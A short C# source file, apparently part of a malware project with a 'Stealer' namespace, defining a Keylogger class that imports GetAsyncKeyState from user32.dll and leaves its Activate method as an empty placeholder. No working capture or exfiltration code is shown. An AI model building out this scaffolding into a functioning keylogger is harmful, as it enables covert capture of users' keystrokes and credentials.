using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows;

namespace Nullable.Modules.Stealer
{
    internal sealed class Keylogger
    {
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(Keys vKey);

        public static void Activate(int Keys)
        {
            //...
        }
    }
}
